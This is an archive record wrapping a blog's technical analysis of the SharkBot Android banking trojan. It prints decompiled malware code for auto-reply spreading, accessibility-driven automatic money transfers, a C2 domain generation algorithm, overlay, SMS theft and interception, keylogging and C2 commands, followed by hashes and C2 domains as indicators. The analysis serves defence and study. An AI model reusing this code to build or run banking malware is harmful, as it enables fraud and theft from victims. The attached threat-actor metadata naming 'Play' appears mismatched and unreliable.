{
    "id": "98865c1d-dd60-412e-97c4-24caa93066b9",
    "created_at": "2023-01-12T15:05:00.332438Z",
    "updated_at": "2025-03-27T02:16:26.284036Z",
    "deleted_at": null,
    "sha1_hash": "eb3f754ce4f3716430301fccb522df1260a3ab66",
    "title": "2022-09-06 - Technical analysis of SharkBot android malware",
    "authors": "",
    "file_creation_date": "2022-09-12T12:01:57Z",
    "file_modification_date": "2022-09-12T12:01:57Z",
    "file_size": 2730535,
    "plain_text": "# Technical analysis of SharkBot android malware\n\n**muha2xmad.github.io/malware-analysis/sharkbot/**\n\n### Muhammad Hasan Ali\n\n#### Malware Analysis learner\n\n 12 minute read\n\n بسم اهلل الرحمن الرحيم\n\n FreePalestine\n\n## Introduction\n\n\nSeptember 6, 2022\n\n\n#### In this blog, we will talk about SharkBot android malware. SharkBot is found at the end of October 2021 by the Cleafy Threat Intelligence Team. The malware comes with classic features such as stealing SMS, stealing contacts, abusing accessibility service, overlay attack,and intercept received SMS. And comes with new techniques such as ATS which enables the malware to transfer money by auto-filling fields in legitimate banking apps and initate money transfers. And Auto Direct reply technique this enables the malware to spread more. When a message comes to the user and the user reply to the message through the notification not through entering the messageing app this called Direct reply. The malware\n\n\n-----\n\n#### can intercept the received messages notification and auto direct reply with a malicious link to download a malicous app. But in newer versions of SharkBot, Auto direct reply is not implemented.\n\n In this article, we will analyze two sample because we will explain Auto direct reply which is not implemented in newer versions of the malware. And we will analyze new version of SharkBot sample which has ATS technique and other techniques.\n\n## Technical review\n\n#### SharkBot version: This version of SharkBot is 2.6 .\n\n Auto direct reply: The malware will try to intercept message notificaion and reply to it with a malicious message contain malicous link to download malicous APK.\n\n Automatic Transfer Systems: allows the attacker to auto-fill fields of banking apps and initate money transfers.\n\n Domain Generation Algorithm: is used by attackers to create random domain names for C2 servers to prevent blocking their communication with C2 servers.\n\n Classic features: features that any android mlaware will have such as steal SMS, steal contacts, overlay attack, keylogging, and steal Cookies.\n\n Anti-emulator: it checks if it’s installed on an emulator or not. If the emulator is detected, then the app won’t launch and it won’t communicate with the C2 server.\n\n Presistence: After the malware is install, the malware will ask for Accessbility service . Then the malware will hide its icon and if you try to uninstall, it goes to Homescreen.\n\n This version of SharkBot is 2.6 .\n```\npublic static final String I = \"release\";\n\n  public static final String M = \"com.ohalqpdj.discopet\";\n\n  public static final boolean b = false;\n\n  public static final int c = 6;\n\n  public static final String j = \"2.6\";\n\n\n\n## Auto Direct Reply\n\n#### Note: auto reply is implemented in old samples. Download from malwarebazaar\n\n This feature of Direct Reply is to enable the user to reply to the incomming message through the notification of the message not entering the app itself. The malware abuses this feature to auto send a malicous link to other users by repling to the message with a malicious link to\n\n```\n\n-----\n\n#### download a malicous APK which in our case will download SharkBot dropper.\n\n\n-----\n\n#### Figure(1) Show what is direct reply - photo from stackoverflow\n\n The malware will first intercept the notifications of comming SMSs then auto reply to them with a message. This message is received from C2 server contains malicuos link to download malcious APK.\n\n\n-----\n\n```\npublic void onNotificationPosted(StatusBarNotification statusBarNotification) {\n\n    if (statusBarNotification != null) {\n\n      a aVar = new a(this);\n\n      this.f2719e = aVar;\n\n      if (System.currentTimeMillis() Long.parseLong(aVar.r(getString(R.string.app_name),\nString.valueOf(System.currentTimeMillis()))) >= 10800000) {\n\n        String r = this.f2719e.r(\"autoReply\", \"{}\");\n\n        String packageName = statusBarNotification.getPackageName();\n\n        d.j.a.a.c.b.a a = a(statusBarNotification.getNotification(),\npackageName);\n\n        Bundle bundle = statusBarNotification.getNotification().extras;\n\n        if (!(bundle == null || a == null || packageName == null ||\nr.equals(\"{}\"))) {\n\n          String b2 = b(packageName + bundle.getString(\"android.title\"));\n\n          JSONObject jSONObject = new JSONObject(r);\n\n          if (jSONObject.has(\"all\") || jSONObject.has(packageName)) {\n\n            long parseLong = Long.parseLong(this.f2719e.r(b2, \"0\"));\n\n            if (!this.f2718d.equals(b2) && System.currentTimeMillis() parseLong > 43200000) {\n\n              this.f2718d = b2;\n\n              a.j(getApplicationContext(), jSONObject.has(\"all\") ?\njSONObject.getString(\"all\") : jSONObject.getString(packageName));\n\n              this.f2719e.z(b2,\nString.valueOf(System.currentTimeMillis()));\n\n              cancelNotification(statusBarNotification.getKey());\n\n            }\n\n          }\n\n        }\n\n        this.f2719e.close();\n\n      }\n\n    }\n\n  }\n\n#### After the malware intercept the notification, the malware will receive a command\nAutoReply to reply to the notification with a message contains a malicicous link. This link\n\n could be a shorten link such as Bit.ly link.\n\n```\n\n-----\n\n```\nelse if (c2  1) {\n\n              if (jSONObject.has(\"autoReply\")) {\n\n                s.this.s.put(\"status\", \"notify\");\n\n                d.j.a.a.c.a aVar2 = new d.j.a.a.c.a(s.this.x);\n\n                aVar2.z(\"autoReply\",\njSONObject.getString(\"autoReply\"));\n\n                aVar2.close();\n\n              } else {\n\n                s.this.s.put(\"status\", \"skip\");\n\n                s.this.s.put(\"skip\", System.currentTimeMillis());\n\n              }\n\n              s sVar3 = s.this;\n\n              sVar3.g0(sVar3.s);\n\n              s.this.r = 2;\n\n            }\n\n## Automatic Transfer Systems ATS\n\n#### Note: other sections is from new samples download from hatching triage\n\n Automatic Transfer Systems ATS is an advanced technique which allows the attacker to auto-fill fields of banking apps and initate money transfers. This happens when the malware abuses the Accessbility service which allows the attacker to get the content of the window and enables the attacker to click/touch and insert text into text field.\n\n Figure(2) Show how Sharkbot preforms ATS - photo from cleafy\n\n```\n\n-----\n\n#### When the victim opens a banking app, the malware will get notified through revceiving an array of events such as clicks/touches, button presses, gestures to be simulated in an specific order. Then the malware will simulate the interation of the victim with the banking information to do the money transfers as if the malware is the user himself.\n```\n public void m(String s) {\n\n    try {\n\n      this.d();\n\n      aa.m().a = false;\n\n      if(s == null) {\n\n        this.b = new JSONArray(new StringBuilder().insert(0, \"\n[{\\\"action\\\":\\\"CLICK\\\",\\\"nodes\\\":\n[{\\\"search\\\":\\\"text\\\",\\\"data\\\":\\\"\").append(this.L).append(\"\\\",\\\"attr\\\":\n{\\\"isClickable\\\":true},\\\"stopNext\\\":true},\n{\\\"search\\\":\\\"text\\\",\\\"data\\\":\\\"\").append(this.F).append(\"\\\",\\\"attr\\\":\n{\\\"isClickable\\\":true},\\\"stopNext\\\":true},\n{\\\"search\\\":\\\"text\\\",\\\"data\\\":\\\"\").append(this.L).append(\"\\\",\\\"getparent\\\":1,\\\"getpare\n : true, \\\"attr\\\":{\\\"isClickable\\\":true},\\\"stopNext\\\":true},\n{\\\"search\\\":\\\"text\\\",\\\"data\\\":\\\"\").append(this.F).append(\"\\\",\\\"getparent\\\":1,\\\"getpare\n : true, \\\"attr\\\":{\\\"isClickable\\\":true},\\\"stopNext\\\":true},\n{\\\"search\\\":\\\"text\\\",\\\"data\\\":\\\"\").append(this.L).append(\"\\\",\\\"get\\\":1,\\\"attr\\\":\n{\\\"isClickable\\\":true},\\\"stopNext\\\":true},\n{\\\"search\\\":\\\"text\\\",\\\"data\\\":\\\"\").append(this.F).append(\"\\\",\\\"get\\\":1,\\\"attr\\\":\n{\\\"isClickable\\\":true},\\\"stopNext\\\":true},\n{\\\"search\\\":\\\"text\\\",\\\"data\\\":\\\"\").append(this.L).append(\"\\\",\\\"get\\\":1,\\\"getparent\\\":1\n : true, \\\"attr\\\":{\\\"isClickable\\\":true},\\\"stopNext\\\":true},\n{\\\"search\\\":\\\"text\\\",\\\"data\\\":\\\"\").append(this.F).append(\"\\\",\\\"get\\\":1,\\\"getparent\\\":1\n : true, \\\"attr\\\":{\\\"isClickable\\\":true},\\\"stopNext\\\":true},\n{\\\"search\\\":\\\"id\\\",\\\"data\\\":\\\"android:id/button1\\\",\\\"attr\\\":\n{\\\"isClickable\\\":true,\\\"isEnabled\\\":true}},\n{\\\"search\\\":\\\"id\\\",\\\"data\\\":\\\"com.android.settings:id/button1\\\",\\\"attr\\\":\n{\\\"isClickable\\\":true,\\\"isEnabled\\\":true}},\n{\\\"search\\\":\\\"id\\\",\\\"data\\\":\\\"com.android.packageinstaller:id/permission_allow_button\\\n{\\\"isClickable\\\":true,\\\"isEnabled\\\":true}},\n{\\\"search\\\":\\\"id\\\",\\\"data\\\":\\\"com.android.permissioncontroller:id/permission_allow_but\n{\\\"isClickable\\\":true,\\\"isEnabled\\\":true}}]},\n{\\\"global\\\":\\\"HOME\\\",\\\"event\\\":\\\"TYPE_WINDOW_CONTENT_CHANGED\\\"}]\").toString());\n\n        return;\n\n      }\n\n      this.b = new JSONArray(s);\n\n    }\n\n    catch(Exception unused_ex) {\n\n    }\n\n  }\n\n\n## Domain Generation Algorithm DGA\n\n```\n\n-----\n\n#### In this sample, it has a hard-coded C2 server link http://f3eac8de096e59ca.live/, but what happens if the C2 server is down? Here comes the role of DGA. DGA technique is used by attackers to create random domain names for C2 servers to prevent blocking their communication with C2 servers. Hard-coded C2 servers are easy to block or taken down but DGA is hard to block or taken down. In this version of SharkBot, the malware uses MD5 to generate domain names, get(3) to get the current week of the current year, get(1) to get the current year.\n```\n private String m() {\n\n    try {\n\n      StringBuilder stringBuilder0 = new StringBuilder();\n\n      Calendar calendar0 = Calendar.getInstance();\n\n      String[] arr_s = \".xyz,.live,.com,.store,.info,.top,.net\".split(\",\");\n\n      int v = 0;\n\n      while(v < arr_s.length) {\n\n        String s = arr_s[v];\n\n        String s1 = aa.m().m(new StringBuilder().insert(0,\ns).append(calendar0.get(3)).toString()) + calendar0.get(1); //generate domain names\n\n        ++v;\n\n        stringBuilder0.append(\",http://\").append(s1.substring(0,\n16)).append(s).append(\"/\");\n\n      }\n\n      return stringBuilder0.toString().toLowerCase();\n\n    }\n\n    catch(Exception unused_ex) {\n\n      return \"\";\n\n    }\n\n  }\n\n\n## Classic features\n\n#### Classic features are features that any android mlaware will have such as steal SMS, steal contacts, overlay attack, keylogging, and steal Cookies.\n\n## Overlay attack\n\n#### The malware will perform overlay attack when the victim opens a specific app usually banking apps or cryptocurrency apps to steal the victim’s credentials.\n\n```\n\n-----\n\n```\nprotected void onCreate(Bundle bundle0) {\n\n    String s;\n\n    super.onCreate(bundle0);\n\n    this.getWindow().setFlags(0x400, 0x400);\n\n    this.requestWindowFeature(1);\n\n    try {\n\n      s = this.getIntent().getStringExtra(\"data\");\n\n    }\n\n    catch(Exception unused_ex) {\n\n      s = null;\n\n    }\n\n    if(s == null) {\n\n      goto label_107;\n\n    }\n\n    try {\n\n      if(!s.isEmpty()) {\n\n        this.setContentView(0x7F0B001D);\n\n        WebView webView0 = new WebView(this);\n\n        this.M = webView0;\n\n        webView0.setWebViewClient(new WebViewClient());\n\n        this.M.getSettings().setJavaScriptEnabled(true);\n\n        this.M.getSettings().setLoadWithOverviewMode(true);\n\n        this.M.getSettings().setUseWideViewPort(false);\n\n        this.M.getSettings().setSupportZoom(false);\n\n        this.M.addJavascriptInterface(new\ncom.ohalqpdj.discopet.Activity.aa(this, this), \"Android\");\n\n        this.M.loadDataWithBaseURL(\"fake-url\", \"<html></html>\", \"text/html\",\n\"UTF-8\", null);\n\n        this.I = (RelativeLayout)this.findViewById(0x7F0801D5);\n\n        if(s.equals(\"url\")) {\n\n          this.I.addView(this.M);\n\n          this.M.loadUrl(aa.m().G);\n\n          return;\n\n        }\n\n        if(s.equals(\"iWantA11\")) {\n\n          this.I.addView(this.M);\n\n          this.M.loadUrl(\"file:///android_asset/help.html\");\n\n          return;\n\n        }\n\n        if(aa.m().m()) {\n\n          this.a();\n\n          return;\n\n        }\n\n        this.M();\n\n        return;\n\n      }\n\n\n```\n\n-----\n\n```\n    label_107:\n\n      c.m().m(0, \"WebActivity HTML_OVERLAY_URL: null\");\n      this.M();\n\n    }\n\n    catch(Exception unused_ex) {\n\n    }\n\n  }\n\n## Steal SMS\n\n#### The malware collect the SMS stored in the victim’s device and send it to C2 server.\n\n```\n\n-----\n\n```\n  protected void onCreate(Bundle bundle0) {\n\n    super.onCreate(bundle0);\n\n    try {\n\n      aa.m();\n\n      new String(\"ComposeSms onCreate\");\n\n      String s = this.getIntent().getStringExtra(\"data\");\n\n      this.b = this.getIntent().getStringExtra(\"ats\");\n\n      int v = -1;\n\n      int v1 = s.hashCode();\n\n      if(v1 == 0xA7794C29) {\n\n        if(s.equals(\"ADMIN_SMS\")) {\n\n          v = 0;\n\n        }\n\n      }\n\n      else if(v1 == 0x50BDF8FA) {\n\n        if(s.equals(\"configSaveSMS\")) {\n\n          v = 1;\n\n        }\n\n      }\n\n      else if(v1 == 2031367170 && (s.equals(\"SEND_SMS\"))) {\n\n        v = 2;\n\n      }\n\n      if(v != 0) {\n\n        switch(v) {\n\n          case 1: {\n\n            this.m(this, new String[]{\"android.permission.RECEIVE_SMS\"},\n0x7B);\n\n            break;\n\n          }\n\n          case 2: {\n\n            this.m(this, new String[]{\"android.permission.SEND_SMS\"},\n0x7B);\n\n            break;\n\n          }\n\n          default: {\n            c.m().m(1, new StringBuilder().insert(0, \"ComposeSms bad\ndata: \").append(s).toString());\n\n          }\n\n        }\n\n      }\n\n      else if(Build.VERSION.SDK_INT >= 29) {\n\n        RoleManager roleManager0 =\n(RoleManager)this.getSystemService(RoleManager.class);\n\n        if((roleManager0.isRoleAvailable(\"android.app.role.SMS\")) &&\n!roleManager0.isRoleHeld(\"android.app.role.SMS\")) {\n\nthis.startActivityForResult(roleManager0.createRequestRoleIntent(\"android.app.role.SMS\n 1);\n\n        }\n\n      }\n\n      else {\n\n```\n\n-----\n\n```\n        ServiceHandler.m().m(null);\n\n        Intent intent0 = new\nIntent(\"android.provider.Telephony.ACTION_CHANGE_DEFAULT\");\n\n        intent0.putExtra(\"package\", this.getPackageName());\n\n        intent0.addFlags(0x10000000);\n\n        this.startActivity(intent0);\n\n      }\n\n    }\n\n    catch(Exception unused_ex) {\n\n      return;\n\n    }\n\n    this.finish();\n\n  }\n\n\n## Keylogging\n\n#### The malware has the capabbility to store key strokes of the victim using startkeylogs. This helps to steal the victim’s banking credentials or login credentials.\n\n```\n\n-----\n\n```\npublic void onAccessibilityEvent(AccessibilityEvent accessibilityEvent0) {\n\n    String s1;\n\n    String s;\n\n    AccessibilityNodeInfo accessibilityNodeInfo0;\n\n    if(accessibilityEvent0 != null) {\n\n      try {\n\n        if(accessibilityEvent0.getPackageName() != null) {\n\n          accessibilityNodeInfo0 = accessibilityEvent0.getSource();\n\n          if(accessibilityNodeInfo0 == null) {\n\n            accessibilityNodeInfo0 = this.getRootInActiveWindow();\n\n            if(accessibilityNodeInfo0 == null) {\n\n              return;\n\n            }\n\n          }\n\n          accessibilityNodeInfo0.refresh();\n\n          s = accessibilityEvent0.getPackageName().toString();\n\n          s1 = this.m(accessibilityEvent0.getEventType());\n\n          if(this.b == null && !s.equals(this.getPackageName()) && (this.G\n> 0 || (aa.m().m(\"sniffer\", s)))) {\n\n            if(this.G > 0) {\n\n              int v = accessibilityEvent0.getEventType();\n\n              goto label_46;\n\n            }\n\n            goto label_65;\n\n          }\n\n          goto label_90;\n\n        }\n\n      }\n\n      catch(Exception unused_ex) {\n\n      }\n\n      return;\n\n    label_46:\n\n      if(v == 16) {\n\n        try {\n\n          JSONObject jSONObject0 = new JSONObject();\n\n          jSONObject0.put(\"logsKeylogger\",\naccessibilityEvent0.getText().toString());\n\n          jSONObject0.put(\"package\", s);\n\n          b.m(App.m()).a(jSONObject0.toString()); // save logs\n\n        }\n\n        catch(Exception unused_ex) {\n\n        }\n\n      }\n\n## Intercept SMS\n\n```\n\n-----\n\n#### Then the malware will intercept the coming SMS. This makes the received SMS hidden from the victim. This useful for the attacker to get OTP.\n```\n public void onReceive(Context context0, Intent intent0) {\n\n    try {\n\n      if(((aa.m().l.equals(\"yes\")) || (this.m(App.m()))) &&\n(intent0.getAction().equals(\"android.provider.Telephony.SMS_RECEIVED\"))) {\n\n        Bundle bundle0 = intent0.getExtras();\n\n        if(bundle0 != null) {\n\n          Object[] arr_object = (Object[])bundle0.get(\"pdus\");\n\n          if(arr_object != null) {\n\n            int v = 0;\n\n            while(v < arr_object.length) {\n\n              SmsMessage smsMessage0 = this.m(arr_object[v], bundle0);\n\n              ++v;\n\n              this.b = new StringBuilder().insert(0,\nsmsMessage0.getDisplayOriginatingAddress()).append(\":\").append(smsMessage0.getDisplayM\n\n            }\n\n            aa aa0 = aa.m();\n\n            aa0.j = this.b;\n\n            JSONObject jSONObject0 = new JSONObject();\n\n            jSONObject0.put(\"smsLogs\", this.b);\n\n            c.m().m(jSONObject0); // upload to C2 server\n\n          }\n\n          this.abortBroadcast();\n\n        }\n\n      }\n\n    }\n\n    catch(Exception unused_ex) {\n\n    }\n\n  }\n\n}\n\n\n\n## Commands\n\n#### This commands will be received from C2 server to the victim.\n\n stopAll: is used to reset/stop the ATS feature, stopping the in progress automation.\n\n smsSend: used to send a text message to the specified phone number by the TAs\n\n openPackage: used to open the specified app from the infected device.\n\n removeApp: used to uninstall the specified app from the infected device\n\n```\n\n-----\n\n#### getDoze: used to check if the permissions to ignore battery optimization are enabled, and show the Android settings to disable them if they aren’st\n\n ats: used to enable ATS attacks. It includes a JSON array with the different events/actions it should simulate to perform ATS (button clicks, etc.)\n\n\n-----\n\n```\ntry {\n\n      if(jSONObject1.has(\"command\")) {\n\n        aa.m();\n\n        new StringBuilder().insert(0, \"onApiRequestDone:\n\").append(jSONObject1).toString();\n\n        String s = jSONObject1.getString(\"command\");\n\n        int v = s.hashCode();\n\n        switch(v) {\n\n          case 0x8BD150FC: {\n\n            boolean z = s.equals(\"updateLib\");\n\n            v1 = z ? 2 : -1;\n\n            break;\n\n          }\n\n          case 0x8FAEE23F: {\n\n            v1 = s.equals(\"stopAll\") ? 8 : -1;\n\n            break;\n\n          }\n\n          case -1003888996: {\n\n            v1 = s.equals(\"openPackage\") ? 4 : -1;\n\n            break;\n\n          }\n\n          case -875734902: {\n\n            v1 = s.equals(\"unlockPhone\") ? 0 : -1;\n\n            break;\n\n          }\n\n          case 0xEA9E40DA: {\n\n            v1 = s.equals(\"deleteLib\") ? 1 : -1;\n\n            break;\n\n          }\n\n          case -122979700: {\n\n            v1 = s.equals(\"enableKeyLogger\") ? 9 : -1;\n\n            break;\n\n          }\n\n          case 0xFA4F7FCD: {\n\n            v1 = s.equals(\"AntiDelete\") ? 5 : -1;\n\n            break;\n\n          }\n\n          case -75592340: {\n\n            v1 = s.equals(\"getDoze\") ? 7 : -1;\n\n            break;\n\n          }\n\n          case 0x17AA0: {\n\n            v1 = s.equals(\"ats\") ? 12 : -1;\n\n            break;\n\n          }\n\n          case 1097035112: {\n\n            v1 = s.equals(\"iWantA11\") ? 6 : -1;\n\n            break;\n\n          }\n\n          case 1255329260: {\n\n            v1 = s.equals(\"makeSwipe\") ? 3 : -1;\n\n            break;\n\n```\n\n-----\n\n```\n          }\n\n          case 0x4C6F0AFD: {\n\n            v1 = s.equals(\"removeApp\") ? 11 : -1;\n\n            break;\n\n          }\n\n          case 1979901105: {\n\n            v1 = s.equals(\"sendSMS\") ? 10 : -1;\n\n            break;\n\n          }\n\n          default: {\n            v1 = -1;\n\n          }\n\n        }\n\n## Communication with C2\n\n#### The malware will communicate with C2 server and POST request with information about the victim’s device.\ntry {\n\n        App app0 = App.m();\n\n        aa aa0 = aa.m();\n\n        jSONObject0.put(\"botID\", aa0.C);\n\n        jSONObject0.put(\"statusScreen\", aa0.h(app0));\n\n        jSONObject0.put(\"pDoze\", ((boolean)(aa.m().m(App.m()) ? 0 : 1)));\n\n        jSONObject0.put(\"pDefaultSms\", aa0.a(app0));\n\n        jSONObject0.put(\"pDrawOverlays\", Settings.canDrawOverlays(app0));\n\n        jSONObject0.put(\"pOpenOverlays\", aa.m().m());\n\n        jSONObject0.put(\"pAccessibility\", aa0.m(app0, ServiceHandler.class));\n\n        jSONObject0.put(\"pNotification\", aa0.M(app0));\n\n        jSONObject0.put(\"pSendSMS\", aa0.m(app0,\n\"android.permission.SEND_SMS\"));\n\n        jSONObject0.put(\"configOverlayReopen\", aa.m().a);\n\n        jSONObject0.put(\"AntiDelete\", ServiceHandler.m().m);\n\n        jSONObject0.put(\"time_knock\", aa0.I);\n\n        jSONObject0.put(\"versionLib\", aa0.J);\n\n        jSONObject0.put(\"hash\", aa0.D.getString(\"hash\"));\n\n        jSONObject0.put(\"admin_url\", this.j);\n\n        jSONObject0.put(\"configNotification\", aa0.f);\n        jSONObject0.put(\"configSaveSMS\", aa0.l);\n\n        jSONObject0.put(\"logsGrabber\", b.m(App.m()).m());\n\n        if(!jSONObject0.has(\"logsSniffer\")) {\n\n          jSONObject0.put(\"logsSniffer\", b.m(App.m()).m());\n\n        }\n\n\n## Anti-emulator\n\n#### The malware try to make it harder on malware analysts to analyze a malware. When the malware is installed on the device, it checks if it’s installed on an emulator or not. If the emulator is detected, then the app won’t launch and it won’t communicate with the C2 server.\n\n```\n\n-----\n\n-----\n\n#### Figure(2) Show how Sharkbot exits when there's an emulator\n\n## IoC\n\n#### package name: com.ohalqpdj.discopet\n\n Hashes:\n\n Old sample: d05fb8c6899c96d1519e46eaea848ead6a17c7ddd0e20228e83c1aa9f264011d\n\n new sample v2.6:\n\n```\nbf3fcdba7148627abfed402d038c99d3b2e60cd87cd04fe22b6ea3aac5ac9151\n\n```\n\n#### C2:\n\n http://f3eac8de096e59ca.live/\n\n C2 generated by DGA:\n\n 8d6102613d7d4ccc.xyz\n\n 3634b259b56f2866.live\n\n 04ff9f101c72a417.com\n\n b5c4f49eae222c10.store\n\n\n-----\n\n#### e30a26a32a8020f1.info\n\n 6d829850c8eb7892.top\n\n efd909761db065cf.net\n\n## Article quote\n\n#### ِلكدِر َبْ[ذ] دُرك على َ[ق] َ[ق]\n\n## REF\n\n#### 1- Hatching report\n\n 2- SharkBot: a new generation Android banking Trojan being distributed on Google Play Store\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-09-06 - Technical analysis of SharkBot android malware.pdf"
    ],
    "report_names": [
        "2022-09-06 - Technical analysis of SharkBot android malware.pdf"
    ],
    "threat_actors": [
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673535900,
    "ts_updated_at": 1743041786,
    "ts_creation_date": 1662984117,
    "ts_modification_date": 1662984117,
    "files": {
        "pdf": "https://archive.orkl.eu/eb3f754ce4f3716430301fccb522df1260a3ab66.pdf",
        "text": "https://archive.orkl.eu/eb3f754ce4f3716430301fccb522df1260a3ab66.txt",
        "img": "https://archive.orkl.eu/eb3f754ce4f3716430301fccb522df1260a3ab66.jpg"
    }
}